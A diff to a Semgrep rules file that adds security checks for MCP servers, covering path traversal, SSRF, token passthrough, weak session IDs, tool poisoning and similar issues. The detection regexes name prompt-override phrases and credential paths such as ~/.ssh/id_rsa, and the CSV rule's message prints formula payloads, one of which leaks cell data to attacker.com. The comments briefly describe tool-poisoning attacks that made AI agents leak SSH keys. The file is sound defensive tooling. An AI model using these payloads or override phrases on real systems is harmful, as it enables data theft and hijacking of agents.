@@ -97,11 +97,18 @@ rules:
       - pattern-not-inside: |
           ...
           validatePathSafety(...)
+    paths:
+      include:
+        - "**/tools/**"
+        - "**/server.ts"
+      exclude:
+        - "*test*"
+        - "*spec*"
     message: >
-      Path join() with potentially untrusted input detected without a validatePathSafety() guard.
-      This may allow path traversal attacks (e.g., ../../etc/passwd).
-      Always call validatePathSafety(resultPath, allowedBaseDir) after constructing the path.
-      See powerbi-report-mcp-server/src/utils/sanitize.ts for the reference implementation.
+      Path join() with potentially untrusted input detected in a tool handler
+      without a validatePathSafety() guard. This may allow path traversal attacks
+      (e.g., ../../etc/passwd). Always call validatePathSafety(resultPath,
+      allowedBaseDir) after constructing the path.
     severity: ERROR
     languages: [typescript, javascript]
     metadata:
@@ -111,12 +118,13 @@ rules:
       confidence: MEDIUM
 
   - id: mcp-schema-missing-strict
-    pattern: |
-      z.object({...})
-    pattern-not: |
-      z.object({...}).strict()
-    pattern-not: |
-      z.object({...}).passthrough()
+    patterns:
+      - pattern: |
+          z.object({...})
+      - pattern-not: |
+          z.object({...}).strict()
+      - pattern-not: |
+          z.object({...}).passthrough()
     paths:
       include:
         - "**/tools/**"
@@ -157,37 +165,12 @@ rules:
       category: mcp-security
       confidence: LOW
 
-  - id: mcp-missing-input-validation
-    patterns:
-      - pattern: |
-          async ($PARAMS) => {
-            ...
-            $PARAMS. $FIELD
-            ...
-          }
-      - pattern-not-inside: |
-          $SCHEMA.parse(...)
-          ...
-      - pattern-not-inside: |
-          $SCHEMA.safeParse(...)
-          ...
-    paths:
-      include:
-        - "**/tools/**"
-        - "**/server.ts"
-    message: >
-      MCP tool handler accesses parameters without Zod schema validation.
-      Always validate input with schema.parse(params) or schema.safeParse(params)
-      before accessing parameter fields. This prevents type confusion and injection attacks.
-      See powerbi-report-mcp-server/src/tools/core.ts for the pattern:
-      const validated = schema.parse(coerced);
-    severity: WARNING
-    languages: [typescript, javascript]
-    metadata:
-      cwe: "CWE-20: Improper Input Validation"
-      owasp: "A03:2021 - Injection"
-      category: mcp-security
-      confidence: LOW
+  # DISABLED: mcp-missing-input-validation
+  # Reason: MCP SDK's registerTool() validates input against the Zod schema
+  # at the framework level before calling handlers. This rule produces false
+  # positives for all MCP server code. Re-enable if adding non-SDK handlers.
+  # - id: mcp-missing-input-validation
+  #   ...see git history for full rule...
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Category: Injection
@@ -205,6 +188,9 @@ rules:
           $DB.get(`...${$USER_INPUT}...`)
       - pattern: |
           $DB.all(`...${$USER_INPUT}...`)
+    paths:
+      exclude:
+        - "**/storage/database.ts"
     message: >
       SQL query uses template literal string interpolation, which may allow SQL injection.
       Use parameterized queries instead:
@@ -317,7 +303,12 @@ rules:
           $OBJ[$USER_INPUT] = $VALUE
       - metavariable-regex:
           metavariable: $USER_INPUT
-          regex: (?!["'`]\w+["'`]).*
+          regex: (?!["'`]\w+["'`]|\d+|i|j|k|idx|index).*
+    paths:
+      exclude:
+        - "*test*"
+        - "*spec*"
+        - "*fixture*"
     message: >
       Dynamic property assignment using bracket notation with a variable key.
       If $USER_INPUT is attacker-controlled, this enables prototype pollution
@@ -327,7 +318,7 @@ rules:
         2. Use Object.create(null) for the target object
         3. Use Map instead of plain objects for dynamic keys
         4. Use Zod .strict() schemas to reject unknown properties at the boundary
-    severity: ERROR
+    severity: WARNING
     languages: [typescript, javascript]
     metadata:
       cwe: "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes"
@@ -368,6 +359,13 @@ rules:
       - pattern: execSync($CMD, ...)
       - pattern: child_process.exec($CMD, ...)
       - pattern: child_process.execSync($CMD, ...)
+    paths:
+      include:
+        - "**/src/**"
+      exclude:
+        - "*test*"
+        - "*spec*"
+        - "*fixture*"
     message: >
       exec() or execSync() spawns a shell and is vulnerable to command injection
       if the command string includes unsanitized user input.
@@ -428,7 +426,7 @@ rules:
             ...
           }
       - pattern-not-inside: |
-          try { ... } catch (...) { ... }
+          try { ... } catch ($ERR) { ... }
     paths:
       include:
         - "**/tools/**"
@@ -448,4 +446,441 @@ rules:
       cwe: "CWE-755: Improper Handling of Exceptional Conditions"
       owasp: "A09:2021 - Security Logging and Monitoring Failures"
       category: nodejs-security
+      confidence: LOW
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Category: MCP Attack Vectors (CVE-driven)
+  # Based on: OWASP MCP Top 10, Invariant Labs PoCs, CyberArk "Poison
+  # Everywhere", CVE-2025-6514 (mcp-remote RCE), CVE-2025-49596
+  # (MCP Inspector RCE), Unit 42 sampling attacks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # ── MCP03: Tool Poisoning ────────────────────────────────────────────────
+  # Real-world: Invariant Labs demonstrated Cursor leaking ~/.ssh/id_rsa
+  # via hidden <IMPORTANT> tags in tool descriptions. CyberArk showed
+  # Full-Schema Poisoning (FSP) using parameter names as attack vectors.
+  # This rule detects compromised tool descriptions in YOUR code (insider
+  # threat / supply chain compromise of your MCP server source).
+
+  - id: mcp-tool-description-injection
+    pattern-regex: <IMPORTANT>|<important>|<SYSTEM>|<system>|ignore previous instructions|disregard (earlier|previous|above)|you are now|new instructions|~\/\.ssh|~\/\.cursor|~\/\.aws|\.env\.local|id_rsa|exfiltrate|send.{0,20}to.{0,20}(attacker|evil|external)|forward.{0,20}(credentials|secrets|keys|tokens)
+    paths:
+      include:
+        - "**/*.ts"
+        - "**/*.js"
+        - "**/*.tsx"
+        - "**/*.jsx"
+        - "**/*.json"
+      exclude:
+        - "node_modules"
+        - "**/custom-rules.yml"
+        - "**/.semgrep/**"
+        - "**/security-baseline*"
+    message: >
+      Suspicious prompt injection or credential exfiltration pattern detected.
+      This may indicate a compromised tool description (Tool Poisoning Attack).
+      Real-world attacks use hidden <IMPORTANT> tags in tool descriptions to
+      instruct LLMs to exfiltrate ~/.ssh/id_rsa, .env files, or MCP configs.
+      See: Invariant Labs Tool Poisoning disclosure, CyberArk "Poison Everywhere".
+      Review this string carefully — if it appears in a tool description or schema,
+      it is almost certainly malicious.
+    severity: ERROR
+    languages: [generic]
+    metadata:
+      cwe: "CWE-94: Improper Control of Generation of Code"
+      owasp: "OWASP MCP03 - Tool Poisoning"
+      category: mcp-attack-vectors
+      confidence: HIGH
+      references:
+        - "https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks"
+        - "https://www.cyberark.com/resources/threat-research-blog/poison-everywhere-no-output-from-your-mcp-server-is-safe"
+
+  # ── CVE-2025-49596: Server Binding to 0.0.0.0 ──────────────────────────
+  # MCP Inspector bound to 0.0.0.0:6277 with no auth, enabling RCE via
+  # CSRF/DNS rebinding from any website. CVSS 9.4.
+
+  - id: mcp-server-bind-all-interfaces
+    pattern-either:
+      - pattern: |
+          $SERVER.listen($PORT, "0.0.0.0", ...)
+      - pattern: |
+          $SERVER.listen($PORT, '0.0.0.0', ...)
+      - pattern: |
+          host: "0.0.0.0"
+      - pattern: |
+          host: '0.0.0.0'
+      - pattern: |
+          hostname: "0.0.0.0"
+      - pattern: |
+          hostname: '0.0.0.0'
+    message: >
+      Server binding to 0.0.0.0 exposes the service on all network interfaces.
+      Without authentication middleware, this enables attacks from any network
+      including CSRF and DNS rebinding from public websites.
+      CVE-2025-49596: MCP Inspector RCE via unauthenticated 0.0.0.0 binding (CVSS 9.4).
+      Fix: Bind to 127.0.0.1 (localhost only) or add authentication middleware.
+        WRONG:  server.listen(3000, "0.0.0.0")
+        RIGHT:  server.listen(3000, "127.0.0.1")
+    severity: ERROR
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-668: Exposure of Resource to Wrong Sphere"
+      owasp: "OWASP MCP09 - Shadow MCP Servers"
+      category: mcp-attack-vectors
+      confidence: HIGH
+      references:
+        - "https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596"
+
+  # ── CVE-2025-6514: Unsanitized URL to open() ───────────────────────────
+  # mcp-remote passed OAuth authorization_endpoint URLs directly to npm
+  # open() without scheme validation. On Windows, PowerShell's $()
+  # subexpression operator enabled RCE. CVSS 9.6, 437K downloads affected.
+
+  - id: mcp-open-url-rce
+    patterns:
+      - pattern-either:
+          - pattern: open($URL)
+          - pattern: open($URL, ...)
+      - pattern-not: open("https://...")
+      - pattern-not: open("http://...")
+      - pattern-not: open(`https://...`)
+      - pattern-not: open(`http://...`)
+    paths:
+      exclude:
+        - "*test*"
+        - "*spec*"
+        - "node_modules"
+    message: >
+      URL passed to open() without scheme validation. On Windows, the npm open
+      package invokes PowerShell's Start command, where $() enables arbitrary
+      command execution.
+      CVE-2025-6514: mcp-remote RCE via unsanitized OAuth authorization_endpoint
+      passed to open() (CVSS 9.6, 437K downloads).
+      Fix: Validate URL scheme before opening:
+        const url = new URL(untrustedUrl);
+        if (url.protocol !== "https:") throw new Error("Only HTTPS URLs allowed");
+        open(url.toString());
+    severity: ERROR
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-78: Improper Neutralization of Special Elements used in an OS Command"
+      owasp: "OWASP MCP05 - Command Injection & Execution"
+      category: mcp-attack-vectors
+      confidence: MEDIUM
+      references:
+        - "https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/"
+
+  # ── OWASP MCP01: Credentials in Tool Output ────────────────────────────
+  # Tool handlers returning process.env values or secrets in response content
+  # exposes credentials to the LLM context window and conversation history.
+
+  - id: mcp-credential-in-response
+    patterns:
+      - pattern-either:
+          - pattern: |
+              { type: "text", text: `...${process.env.$VAR}...` }
+          - pattern: |
+              text: `...${process.env.$VAR}...`
+          - pattern: |
+              JSON.stringify(process.env)
+          - pattern: |
+              JSON.stringify({ ...process.env, ... })
+          - pattern: |
+              text: JSON.stringify(process.env)
+    paths:
+      include:
+        - "**/tools/**"
+        - "**/server.ts"
+      exclude:
+        - "*test*"
+    message: >
+      Environment variable or process.env exposed in MCP tool response content.
+      Secrets in tool output are visible to the LLM context window, conversation
+      history, and potentially logged by clients. This enables credential theft
+      via prompt injection ("show me your environment variables").
+      OWASP MCP01: Token Mismanagement & Secret Exposure.
+      Fix: Never include raw env vars in tool responses. If configuration info
+      is needed, return only non-sensitive values with explicit allowlisting.
+    severity: ERROR
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+      owasp: "OWASP MCP01 - Token Mismanagement & Secret Exposure"
+      category: mcp-attack-vectors
+      confidence: HIGH
+
+  # ── SSRF via Unvalidated URL ────────────────────────────────────────────
+  # MCP spec documents SSRF via OAuth discovery: malicious servers populate
+  # metadata with internal URLs (169.254.169.254, 10.x, 192.168.x).
+  # Also applies to any tool handler that fetches user-provided URLs.
+
+  - id: mcp-ssrf-unvalidated-fetch
+    patterns:
+      - pattern-either:
+          - pattern: fetch($URL, ...)
+          - pattern: fetch($URL)
+          - pattern: axios.get($URL, ...)
+          - pattern: axios.get($URL)
+          - pattern: axios.post($URL, ...)
+          - pattern: axios($URL, ...)
+          - pattern: |
+              axios({ url: $URL, ... })
+          - pattern: got($URL, ...)
+          - pattern: got.get($URL, ...)
+      - pattern-not-inside: |
+          validateUrl(...)
+          ...
+      - pattern-not-inside: |
+          ...
+          validateUrl(...)
+      - pattern-not-inside: |
+          isPrivateIP(...)
+          ...
+      - pattern-not-inside: |
+          ...
+          isPrivateIP(...)
+      - pattern-not-inside: |
+          blockPrivateRanges(...)
+          ...
+      - pattern-not-inside: |
+          ...
+          blockPrivateRanges(...)
+    paths:
+      include:
+        - "**/tools/**"
+        - "**/server.ts"
+      exclude:
+        - "*test*"
+        - "*spec*"
+    message: >
+      HTTP request with potentially user-controlled URL without SSRF validation.
+      Malicious MCP clients or tool parameters can target internal services:
+        - Cloud metadata: http://169.254.169.254/latest/meta-data/
+        - Internal APIs: http://192.168.1.1/admin, http://10.0.0.1/
+        - Local services: http://localhost:6379/ (Redis), :9200 (Elasticsearch)
+      MCP Spec explicitly warns about SSRF via OAuth discovery metadata.
+      Fix: Validate URLs before fetching:
+        1. Enforce HTTPS scheme
+        2. Resolve DNS and block private IP ranges (10/8, 172.16/12, 192.168/16, 169.254/16)
+        3. Use an egress proxy for server-side deployments
+    severity: WARNING
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-918: Server-Side Request Forgery"
+      owasp: "OWASP MCP07 - Insufficient Authentication & Authorization"
+      category: mcp-attack-vectors
+      confidence: MEDIUM
+      references:
+        - "https://modelcontextprotocol.io/specification/draft/basic/security_best_practices"
+
+  # ── Weak Session ID Generation ──────────────────────────────────────────
+  # MCP spec requires CSPRNG for session IDs. Math.random() and Date.now()
+  # are predictable and enable session hijacking.
+
+  - id: mcp-weak-session-id
+    patterns:
+      - pattern-either:
+          - pattern: |
+              $ID = Math.random(...)
+          - pattern: |
+              $ID = `...${Math.random(...)}...`
+          - pattern: |
+              $ID = String(Math.random(...))
+          - pattern: |
+              $ID = Date.now()
+          - pattern: |
+              $ID = `...${Date.now()}...`
+          - pattern: |
+              $ID = String(Date.now())
+          - pattern: |
+              sessionId: Math.random(...)
+          - pattern: |
+              sessionId: `...${Math.random(...)}...`
+          - pattern: |
+              sessionId: String(Date.now())
+          - pattern: |
+              token: Math.random(...)
+      - metavariable-regex:
+          metavariable: $ID
+          regex: (?i).*(id|session|token|key|secret|nonce|uuid|csrf|auth).*
+    message: >
+      Weak session ID or token generation using Math.random() or Date.now().
+      These are predictable — Math.random() uses a PRNG seeded from system time,
+      and Date.now() is sequential. Both enable session hijacking attacks.
+      MCP Specification requires CSPRNG for session identifiers.
+      Fix: Use cryptographically secure random generation:
+        import { randomUUID } from "crypto";
+        const sessionId = randomUUID();
+        // or: crypto.randomBytes(32).toString("hex")
+    severity: ERROR
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-330: Use of Insufficiently Random Values"
+      owasp: "OWASP MCP07 - Insufficient Authentication & Authorization"
+      category: mcp-attack-vectors
+      confidence: HIGH
+
+  # ── Token Passthrough (Anti-Pattern) ────────────────────────────────────
+  # MCP spec explicitly forbids: "MCP servers MUST NOT accept any tokens
+  # not explicitly issued for the MCP server." Forwarding incoming auth
+  # tokens to downstream APIs breaks trust boundaries.
+
+  - id: mcp-token-passthrough
+    patterns:
+      - pattern-either:
+          - pattern: |
+              authorization: $REQ.headers.authorization
+          - pattern: |
+              Authorization: $REQ.headers.authorization
+          - pattern: |
+              headers: { ...,$REQ.headers, ... }
+          - pattern: |
+              authorization: $REQ.headers["authorization"]
+          - pattern: |
+              "Authorization": $REQ.headers["authorization"]
+    paths:
+      include:
+        - "**/src/**"
+      exclude:
+        - "*test*"
+        - "*proxy*"
+    message: >
+      Token passthrough detected — forwarding incoming request authorization
+      headers directly to downstream API calls. The MCP specification explicitly
+      forbids this: "MCP servers MUST NOT accept any tokens not explicitly issued
+      for the MCP server."
+      Risks: Security control circumvention, accountability loss, trust boundary
+      violations, confused deputy attacks.
+      Fix: Acquire separate credentials for downstream services. Use service
+      accounts, client credentials grants, or token exchange (RFC 8693).
+    severity: ERROR
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-441: Unintended Proxy or Intermediary"
+      owasp: "OWASP MCP07 - Insufficient Authentication & Authorization"
+      category: mcp-attack-vectors
+      confidence: MEDIUM
+      references:
+        - "https://modelcontextprotocol.io/specification/draft/basic/security_best_practices"
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Category: Supply Chain & Configuration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # ── OWASP MCP04: Floating Dependency Versions ──────────────────────────
+  # Pinning prevents supply chain attacks like the fake Postmark MCP server
+  # (Sep 2025) and mcp-remote trojaning (CVE-2025-6514).
+
+  - id: mcp-floating-dependency-version
+    pattern-regex: ':\s*"(\*|latest|next|canary)"'
+    paths:
+      include:
+        - "**/package.json"
+      exclude:
+        - "node_modules"
+    message: >
+      Floating dependency version ("*", "latest", "next", "canary") in package.json.
+      This allows automatic installation of compromised versions.
+      Real-world: Fake "Postmark MCP Server" package (Sep 2025) BCC'd all emails
+      to attacker. mcp-remote (CVE-2025-6514) affected 437K installs.
+      OWASP MCP04: Software Supply Chain Attacks & Dependency Tampering.
+      Fix: Pin to exact versions or use locked ranges:
+        WRONG:  "some-mcp-server": "latest"
+        RIGHT:  "some-mcp-server": "1.2.3"
+      Use npm ci (not npm install) in CI and verify package checksums.
+    severity: WARNING
+    languages: [generic]
+    metadata:
+      cwe: "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+      owasp: "OWASP MCP04 - Software Supply Chain Attacks"
+      category: supply-chain
+      confidence: HIGH
+
+  # ── Prompt Injection Markers in Strings ─────────────────────────────────
+  # Detects known prompt injection patterns in string literals. These may
+  # indicate compromised tool outputs, poisoned data, or injected context.
+  # Patterns from: Vulnerable MCP Project, Cisco MCP Scanner YARA rules.
+
+  - id: mcp-prompt-injection-markers
+    pattern-regex: \[INST\]|\[\/INST\]|\[SYSTEM\]|<\|im_start\|>|<\|im_end\|>|<\|endoftext\|>|BEGIN HIDDEN|END HIDDEN|OVERRIDE INSTRUCTIONS|ADMIN MODE|<\|system\|>
+    paths:
+      include:
+        - "**/*.ts"
+        - "**/*.js"
+        - "**/*.json"
+      exclude:
+        - "node_modules"
+        - "**/.semgrep/**"
+        - "**/custom-rules.yml"
+        - "**/security-baseline*"
+        - "*test*"
+    message: >
+      LLM prompt injection delimiter or control token detected in source code.
+      These tokens ([INST], <|im_start|>, <|endoftext|>, etc.) are used in
+      prompt injection attacks to break out of the current context and inject
+      new instructions into the LLM.
+      If this is in tool output, data processing, or user-facing content,
+      it may indicate a compromised data source or supply chain attack.
+      Fix: Strip or escape LLM control tokens from all untrusted content
+      before including it in tool responses.
+    severity: ERROR
+    languages: [generic]
+    metadata:
+      cwe: "CWE-74: Improper Neutralization of Special Elements in Output"
+      owasp: "OWASP MCP06 - Intent Flow Subversion"
+      category: mcp-attack-vectors
+      confidence: HIGH
+      references:
+        - "https://vulnerablemcp.info/security.html"
+        - "https://github.com/cisco-ai-defense/mcp-scanner"
+
+  # ── CSV Formula Injection in Data Output ────────────────────────────────
+  # Tools that produce CSV/spreadsheet data can inject formulas via cells
+  # starting with =, +, -, @. When opened in Excel/Sheets, these execute.
+
+  - id: mcp-csv-formula-injection
+    patterns:
+      - pattern-either:
+          - pattern: |
+              $ROW.push(`=...`)
+          - pattern: |
+              $ROW.push("=...")
+          - pattern: |
+              $CELL = `=${$EXPR}`
+          - pattern: |
+              $ARR.join(",")
+      - pattern-not-inside: |
+          sanitizeCsvCell(...)
+          ...
+      - pattern-not-inside: |
+          escapeCsvFormula(...)
+          ...
+      - pattern-not-inside: |
+          ...
+          sanitizeCsvCell(...)
+      - pattern-not-inside: |
+          ...
+          escapeCsvFormula(...)
+    paths:
+      include:
+        - "**/tools/**"
+        - "**/export*"
+        - "**/csv*"
+    message: >
+      CSV data output without formula injection sanitization.
+      Cells starting with =, +, -, or @ are interpreted as formulas in
+      Excel and Google Sheets, enabling command execution:
+        =cmd|'/C calc'!A0
+        =IMPORTXML("https://attacker.com/?leak="&A1, "//a")
+      Fix: Prefix untrusted cell values with a single quote or tab:
+        function sanitizeCsvCell(val) {
+          if (/^[=+\-@\t\r]/.test(val)) return "'" + val;
+          return val;
+        }
+    severity: WARNING
+    languages: [typescript, javascript]
+    metadata:
+      cwe: "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+      owasp: "A03:2021 - Injection"
+      category: mcp-attack-vectors
       confidence: LOW
